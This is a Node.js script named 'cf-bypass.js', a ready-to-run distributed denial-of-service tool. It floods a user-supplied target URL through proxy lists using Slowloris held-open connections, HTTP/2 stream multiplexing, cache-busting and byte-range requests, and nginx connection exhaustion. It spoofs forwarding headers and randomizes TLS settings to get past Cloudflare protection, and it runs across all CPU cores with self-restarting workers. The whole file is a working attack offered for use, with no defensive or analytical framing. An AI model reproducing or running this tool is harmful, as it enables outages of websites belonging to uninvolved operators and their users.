const axios = require('axios');
const fs = require('fs');
const https = require('https');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const crypto = require('crypto');
const url = require('url');
const cluster = require('cluster');
const os = require('os');
const net = require('net');
const dns = require('dns').promises;

// Configuration
const TARGET_URL = process.argv[2];
const DURATION = parseInt(process.argv[3], 10) * 1000;
const CONCURRENCY_LEVEL = process.argv[4] ? parseInt(process.argv[4], 10) : 500;
const ATTACK_MODE = process.argv[5] || 'mixed'; // nginx, mixed, or cloudflare

if (!TARGET_URL || !DURATION) {
    console.error('❌ Usage: node cf-bypass.js <url> <time> [concurrency] [attack_mode]');
    console.error(' Attack modes: nginx, mixed, cloudflare');
    process.exit(1);
}

// Enhanced resources
const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(line => line.trim() !== '');
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(line => line.trim() !== '');
const referrers = [
    'https://www.google.com/', 'https://www.facebook.com/', 'https://twitter.com/',
    'https://www.reddit.com/', 'https://www.youtube.com/', 'https://www.bing.com/'
];
const languages = ['en-US,en;q=0.9', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9', 'es-ES,es;q=0.9'];
const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
];

// Nginx-specific attack vectors
const nginxSpecificPaths = [
    '/nginx-status', '/status', '/server-status', '/phpfpm-status', '/mysql-status',
    '/wp-admin', '/wp-login.php', '/admin', '/administrator', '/.env', '/config.php',
    '/debug', '/phpinfo', '/.git/HEAD', '/api/', '/graphql', '/redis', '/memcached'
];

if (proxies.length === 0 || userAgents.length === 0) {
    console.error('❌ Pastikan proxy.txt dan ua.txt memiliki isi!');
    process.exit(1);
}

const NUM_WORKERS = os.cpus().length;
const targetHost = new URL(TARGET_URL).hostname;

// Cache DNS resolution to avoid DNS delays
const dnsCache = new Map();
async function resolveDns(hostname) {
    if (dnsCache.has(hostname)) {
        return dnsCache.get(hostname);
    }
    try {
        const addresses = await dns.resolve4(hostname);
        const ip = addresses[0];
        dnsCache.set(hostname, ip);
        return ip;
    } catch (err) {
        return hostname;
    }
}

// Enhanced TLS fingerprint randomization
const generateTLSOptions = () => {
    const ciphers = [
        'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
        'TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256'
    ];
    
    const curves = ['X25519', 'prime256v1', 'secp384r1', 'secp521r1'];
    
    return {
        rejectUnauthorized: false,
        secureProtocol: 'TLSv1_2_method',
        ciphers: getRandomItem(ciphers),
        ecdhCurve: getRandomItem(curves),
        secureOptions: crypto.constants.SSL_OP_ALL | 
                      crypto.constants.SSL_OP_NO_SSLv2 | 
                      crypto.constants.SSL_OP_NO_SSLv3 |
                      crypto.constants.SSL_OP_NO_COMPRESSION |
                      crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE,
        honorCipherOrder: true,
        sessionTimeout: 60000,
        tickTimeout: 30000
    };
};

// Advanced header generation with more variability
const generateHeaders = (userAgent, targetUrl, isNginxAttack = false) => {
    const urlObj = new URL(targetUrl);
    const headers = {
        'User-Agent': userAgent,
        'Accept': getRandomItem(acceptHeaders),
        'Accept-Language': getRandomItem(languages),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': isNginxAttack ? 'keep-alive' : (Math.random() > 0.5 ? 'keep-alive' : 'close'),
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'TE': 'trailers',
        'Referer': getRandomItem(referrers),
        'Host': urlObj.hostname,
        'Origin': `${urlObj.protocol}//${urlObj.hostname}`,
        'DNT': Math.random() > 0.5 ? '1' : '0',
        'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"'
    };
    
    // For Nginx attacks, add headers that might trigger processing
    if (isNginxAttack) {
        headers['X-Forwarded-For'] = generateRandomIP();
        headers['X-Real-IP'] = generateRandomIP();
        headers['X-Forwarded-Host'] = urlObj.hostname;
        headers['X-Forwarded-Proto'] = urlObj.protocol.replace(':', '');
        
        if (Math.random() > 0.7) {
            headers['Range'] = 'bytes=0-1000';
        }
        if (Math.random() > 0.8) {
            headers['If-Modified-Since'] = new Date(Date.now() - Math.random() * 10000000000).toUTCString();
        }
    } else {
        // Randomly add additional headers for CF bypass
        if (Math.random() > 0.7) {
            headers['X-Requested-With'] = 'XMLHttpRequest';
        }
        if (Math.random() > 0.8) {
            headers['X-Forwarded-For'] = generateRandomIP();
        }
        if (Math.random() > 0.8) {
            headers['X-Real-IP'] = generateRandomIP();
        }
    }
    
    return headers;
};

// Utility functions
const getRandomItem = (array) => array[Math.floor(Math.random() * array.length)];

const generateRandomIP = () => {
    return `${Math.floor(Math.random() * 255) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
};

// Advanced attack methods
const createSlowLorisConnections = async (target, count) => {
    const connections = [];
    const targetUrl = new URL(target);
    const host = await resolveDns(targetUrl.hostname);
    const port = targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80);
    
    for (let i = 0; i < count; i++) {
        try {
            const socket = net.createConnection({ host, port }, () => {
                // Partial HTTP request to keep connection open
                socket.write(`GET ${targetUrl.pathname} HTTP/1.1\r\n`);
                socket.write(`Host: ${targetUrl.hostname}\r\n`);
                socket.write(`User-Agent: ${getRandomItem(userAgents)}\r\n`);
                socket.write('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n');
                // Don't complete the request
            });
            
            socket.setTimeout(30000);
            connections.push(socket);
            
            // Send partial data periodically to keep connection alive
            const interval = setInterval(() => {
                if (socket.writable) {
                    socket.write(`X-a: ${crypto.randomBytes(4).toString('hex')}\r\n`);
                }
            }, 15000);
            
            socket.on('close', () => {
                clearInterval(interval);
                const index = connections.indexOf(socket);
                if (index > -1) connections.splice(index, 1);
            });
            
            socket.on('error', () => {
                clearInterval(interval);
                const index = connections.indexOf(socket);
                if (index > -1) connections.splice(index, 1);
            });
        } catch (err) {
            // Continue even if some connections fail
        }
    }
    
    return connections;
};

// HTTP/2 multiplexing attack
const sendHttp2MultiplexedRequests = async (proxy, userAgent, targetUrl, isNginxAttack = false) => {
    const [host, port] = proxy.split(':');
    
    try {
        const session = http2.connect(targetUrl, {
            createConnection: () => tls.connect({ 
                host, 
                port: port || 443, 
                servername: new URL(targetUrl).hostname,
                ...generateTLSOptions() 
            })
        });
        
        session.on('error', (err) => {});
        
        // Create multiple streams (multiplexing)
        for (let i = 0; i < 20; i++) {
            try {
                const headers = generateHeaders(userAgent, targetUrl, isNginxAttack);
                
                // For Nginx attacks, target specific paths
                const finalTargetUrl = isNginxAttack && Math.random() > 0.7 ? 
                    targetUrl.origin + getRandomItem(nginxSpecificPaths) : targetUrl;
                
                const req = session.request({
                    ...headers,
                    ':path': new URL(finalTargetUrl).pathname + 
                            (isNginxAttack ? `?cachebust=${crypto.randomBytes(8).toString('hex')}` : '')
                });
                
                req.on('response', (headers) => {
                    req.close();
                });
                
                req.on('error', () => {});
                req.end();
            } catch (err) {
                // Continue despite errors
            }
        }
        
        setTimeout(() => {
            try {
                session.close();
            } catch (err) {}
        }, 10000);
        
    } catch (err) {
        // Fall back to HTTP/1.1 if HTTP/2 fails
        await sendHttpRequest(proxy, userAgent, targetUrl, isNginxAttack);
    }
};

// Standard HTTP request
const sendHttpRequest = async (proxy, userAgent, targetUrl, isNginxAttack = false) => {
    const [host, port] = proxy.split(':');
    const httpsAgent = new https.Agent({
        host,
        port: port || 443,
        keepAlive: isNginxAttack, // Keep connections open for Nginx attacks
        ...generateTLSOptions(),
    });

    try {
        // For Nginx attacks, sometimes target specific paths
        const finalTargetUrl = isNginxAttack && Math.random() > 0.7 ? 
            targetUrl.origin + getRandomItem(nginxSpecificPaths) : targetUrl;
            
        await axios.get(finalTargetUrl, {
            headers: generateHeaders(userAgent, targetUrl, isNginxAttack),
            httpsAgent,
            timeout: isNginxAttack ? 15000 : 8000, // Longer timeout for Nginx
            maxRedirects: 0
        });
    } catch (err) {
        // Most requests will "fail" due to timeout or redirects, which is expected
    }
};

// Nginx-specific connection exhaustion attack
const sendNginxExhaustionAttack = async (proxy, userAgent, targetUrl) => {
    const [host, port] = proxy.split(':');
    const target = new URL(targetUrl);
    
    try {
        // Create multiple connections to exhaust worker_connections
        for (let i = 0; i < 5; i++) {
            const socket = net.createConnection({
                host: await resolveDns(target.hostname),
                port: target.port || (target.protocol === 'https:' ? 443 : 80)
            });
            
            // Send incomplete requests to keep connections open
            socket.write(`GET ${target.pathname || '/'} HTTP/1.1\r\n`);
            socket.write(`Host: ${target.hostname}\r\n`);
            socket.write(`User-Agent: ${userAgent}\r\n`);
            // Don't complete the request
            
            // Close after random time
            setTimeout(() => {
                try {
                    socket.destroy();
                } catch (e) {}
            }, 10000 + Math.random() * 20000);
        }
    } catch (err) {
        // Connection failures are expected
    }
};

// Cache-busting requests with random parameters
const sendCacheBustRequest = async (proxy, userAgent, targetUrl, isNginxAttack = false) => {
    const randomParams = crypto.randomBytes(10).toString('hex');
    const bustedUrl = targetUrl + (targetUrl.includes('?') ? '&' : '?') + 
                     `_=${Date.now()}&cachebust=${randomParams}`;
    
    return sendHttpRequest(proxy, userAgent, bustedUrl, isNginxAttack);
};

// Nginx-specific range attack (byte-range requests)
const sendNginxRangeAttack = async (proxy, userAgent, targetUrl) => {
    const [host, port] = proxy.split(':');
    const httpsAgent = new https.Agent({
        host,
        port: port || 443,
        keepAlive: true,
        ...generateTLSOptions(),
    });

    try {
        await axios.get(targetUrl, {
            headers: {
                ...generateHeaders(userAgent, targetUrl, true),
                'Range': `bytes=${Math.floor(Math.random() * 1000)}-${Math.floor(Math.random() * 5000)}`
            },
            httpsAgent,
            timeout: 10000,
            maxRedirects: 0
        });
    } catch (err) {
        // Range requests often fail, which is expected
    }
};

// Main attack function
const startAdvancedAttack = async () => {
    const isNginxAttack = ATTACK_MODE === 'nginx' || (ATTACK_MODE === 'mixed' && Math.random() > 0.5);
    
    console.log(`Worker ${process.pid} starting ${isNginxAttack ? 'Nginx' : 'CF'} attack...`);
    
    // Create slowloris connections (more effective against Nginx)
    let slowLorisConnections = [];
    if (isNginxAttack || Math.random() > 0.3) {
        const connectionCount = isNginxAttack ? 20 : 10;
        slowLorisConnections = await createSlowLorisConnections(TARGET_URL, connectionCount);
    }
    
    // Main request loop
    const requestPromises = [];
    
    for (let i = 0; i < CONCURRENCY_LEVEL; i++) {
        const proxy = getRandomItem(proxies);
        const userAgent = getRandomItem(userAgents);
        
        // Use different attack methods based on target type
        const methodChoice = Math.random();
        
        if (isNginxAttack) {
            // Nginx-specific attacks
            if (methodChoice < 0.2) {
                requestPromises.push(
                    sendNginxExhaustionAttack(proxy, userAgent, TARGET_URL)
                        .catch(() => {})
                );
            } else if (methodChoice < 0.4) {
                requestPromises.push(
                    sendNginxRangeAttack(proxy, userAgent, TARGET_URL)
                        .catch(() => {})
                );
            } else if (methodChoice < 0.6) {
                // HTTP/2 multiplexing for Nginx
                requestPromises.push(
                    sendHttp2MultiplexedRequests(proxy, userAgent, TARGET_URL, true)
                        .catch(() => {})
                );
            } else {
                // Standard request with Nginx targeting
                requestPromises.push(
                    sendHttpRequest(proxy, userAgent, TARGET_URL, true)
                        .catch(() => {})
                );
            }
        } else {
            // Cloudflare bypass attacks
            if (methodChoice < 0.3) {
                // HTTP/2 multiplexing
                requestPromises.push(
                    sendHttp2MultiplexedRequests(proxy, userAgent, TARGET_URL)
                        .catch(() => {})
                );
            } else if (methodChoice < 0.6) {
                // Cache busting
                requestPromises.push(
                    sendCacheBustRequest(proxy, userAgent, TARGET_URL)
                        .catch(() => {})
                );
            } else {
                // Standard request
                requestPromises.push(
                    sendHttpRequest(proxy, userAgent, TARGET_URL)
                        .catch(() => {})
                );
            }
        }
        
        // Control concurrency
        if (requestPromises.length >= 50) {
            await Promise.all(requestPromises).catch(() => {});
            requestPromises.length = 0;
            await new Promise(resolve => setTimeout(resolve, 100));
        }
    }
    
    // Clean up
    slowLorisConnections.forEach(conn => {
        try {
            conn.destroy();
        } catch (err) {}
    });
};

// Cluster management
if (cluster.isMaster) {
    console.log(`🌐 Target: ${TARGET_URL}`);
    console.log(`⏳ Duration: ${DURATION / 1000} seconds`);
    console.log(`👨‍💻 Workers: ${NUM_WORKERS}`);
    console.log(`🚀 Concurrency: ${CONCURRENCY_LEVEL} requests/worker`);
    console.log(`🎯 Attack Mode: ${ATTACK_MODE}`);

    // Fork workers
    for (let i = 0; i < NUM_WORKERS; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died, restarting...`);
        cluster.fork();
    });

    setTimeout(() => {
        console.log('✅ Attack completed. Terminating all workers.');
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    }, DURATION);
} else {
    // Worker process
    setInterval(() => {
        startAdvancedAttack().catch(() => {});
    }, 100);
}
